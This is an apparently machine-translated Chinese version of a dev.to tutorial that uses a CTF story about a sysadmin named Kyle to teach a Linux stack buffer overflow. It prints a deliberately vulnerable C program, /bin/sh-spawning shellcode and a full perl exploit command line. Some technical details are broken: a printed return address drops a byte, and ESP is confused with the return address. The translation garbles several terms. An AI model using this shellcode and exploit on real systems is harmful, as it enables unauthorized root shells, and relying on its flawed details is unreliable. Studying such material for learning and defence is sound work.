# 欢迎工作凯尔！

> 原文：<https://dev.to/terceranexus6/welcome-at-work-kyle-2148>

你好。今年夏天，我一直在做几个项目，但在此期间，我练习了一点关于利用 Linux 作为网络安全热身的一部分。我甚至和我的乳齿象追随者们分享了一个开发挑战。我想你们可能会觉得有趣，所以我决定写一下。

## 简介

首先，Linux 在剥削什么？哦好吧。当我们谈到“利用”时，我们的意思是利用漏洞来危害系统，进入系统。在这种情况下，我将重点放在 Linux 上。在这种特定情况下，强烈建议熟悉 Linux 系统、Perl、C 和汇编。我们开始吧。

## 堆栈溢出

我们都很熟悉这个术语，因为我们中的许多人都通过查看[页面](https://stackoverflow.com/)来解决我们的编程疑惑。但在此之前，是一个不正确的缓冲区处理造成的编程噩梦。在 80 年代后期，“网络蠕虫”(基于这种方法)搞乱了成千上万的计算机。尽管现在这种攻击不常见，但在某些情况下仍然有效。为了解释最基本的情况，我将向[介绍我为乳齿象挑战赛制作的故事](https://gitlab.com/terceranexus6/mastodon_challenges/blob/master/2%20-%20Welcome%20at%20work%20Kyle!/story.md)。

Kyle 是一个非常好的 sysadmid，他创建了一个 C 脚本，每天早上都向他致敬。他甚至在 gitlab 上与他的大学分享。他用它来创建和执行主要的 goodmornign 程序。但该公司遭受了一次攻击，攻击始于凯尔的电脑，特工奥菲利娅试图对其进行调查，以拯救凯尔并发现真正的攻击者。凯尔向欧菲莉亚展示了名为*早安*的代码:

```
#include <string.h>
#include <stdio.h>

void func(char *arg) {
  char name[32];
  strcpy(name, arg);
  printf("\nWelcome at work, master %s\n\n", name);
}

int main(int argc, char *argv[]){
  if ( argc != 2 ){
    printf("Use: %s NAME\n",argv[0]);
    //exit(0);
  }
  func(argv[1]);
  printf("Good luck today.\n\n");
  return 0;
} 
```

Enter fullscreen mode Exit fullscreen mode

在这个故事中，Ophelia——被你必须输入你的名字这一事实所触发——在她的计算机上尝试了下面一行:`./goodmorning AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`,它返回一个分段错误。

[![](img/321154083aa8ebf30d052cf94fed1cd9.png)](https://res.cloudinary.com/practicaldev/image/fetch/s---OJp1I-_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://media0.giphy.com/media/NTiyOTkV8a7PXHoNvy/giphy.gif%3Fcid%3D790b76111532d3f558ecc9bc3421c52d79f8736352620110%26rid%3Dgiphy.gif)

这是第一个线索，表明挑战是剥削。为什么会返回分段错误？如果我们看看代码中的“ *name* 字符变量，我们可以看到 Kyle 认为没有人会使用超过 32 个字符的名称。

```
...
char name[32];
... 
```

Enter fullscreen mode Exit fullscreen mode

因此，当使用超过 32 个字符作为参数时(在本例中为`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`)，它将返回该分段错误。这似乎是无害的，但作为一个漏洞可能会扩大到一些重要的东西。如果我们正确理解编程中的内存分配(如果我们特别注意这一点，C 是一种非常好的语言)，我们知道每个单独的内核将一个接一个地执行指令，这就是为什么我们需要 IP 寄存器:在执行中正确地组织指令。当执行一个 Linux 程序时，它在内存中有一个按区域划分的结构。这可以使用`size`进行检查。反正！现在让我们跳到汇编。我们将重点关注 EBP(帧指针)和 EIP(指令指针)，它们指向要执行的下一条指令的第一个字节，以及 ESP(堆栈指针)，它们指向堆栈上最近推送的值。现在，如果我们设法改变 EIP，我们将能够操纵程序的流程。然后，我们将引入一种叫做“外壳代码”的东西，或一种进入系统的攻击。我们想执行一个*外壳代码*(十六进制)，在完成之前给我们管理员权限，就像这样:

```
void main(){
 char *name[2];
 name[0] = "/bin/sh";
 name[1] = NULL;
 execve(name[0], name, NULL);
} 
```

Enter fullscreen mode Exit fullscreen mode

回到故事中，特工奥菲利娅通过多次尝试自己制作的一个剧本，得到了 ESP，直到最后得到“0x08048444”。

[![](img/aae006253db5ab1a6f6f1816e75404be.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--A-FeATqR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/http://giphygifs.s3.amazonaws.com/media/mn0W2gnnzARGg/giphy.gif)

我们可以在 Python 中使用适当的十六进制格式(例如):

```
hexnum = 0x08048444
print(hexnum.to_bytes(4, 'little')) 
```

Enter fullscreen mode Exit fullscreen mode

我们会得到`\x84\x04\x08`。现在我们必须立刻用它来进攻。我们将在易受攻击的“名称”变量中引入攻击，所以，它正常的 *goodmorning* 执行应该是:

```
$ ./goodmorning Kyle 
```

Enter fullscreen mode Exit fullscreen mode

我们将使用:

```
$ ./goodmorning `perl -e 'print "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80"."AAAAAAAAAAAAAAAAAAAAA"."\x84\x04\x08"'` 
```

Enter fullscreen mode Exit fullscreen mode

在这种情况下，我首先接受任何被认为会危及系统安全的脚本，在这种情况下`\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80`只是上面的外壳代码。

这样，Ophelia 知道攻击者如何使用 Kyle 的例程来攻击系统，破坏别名，用执行别名的脚本更改别名，但使用外壳代码作为参数。

就这样。就这么定了！希望你们喜欢。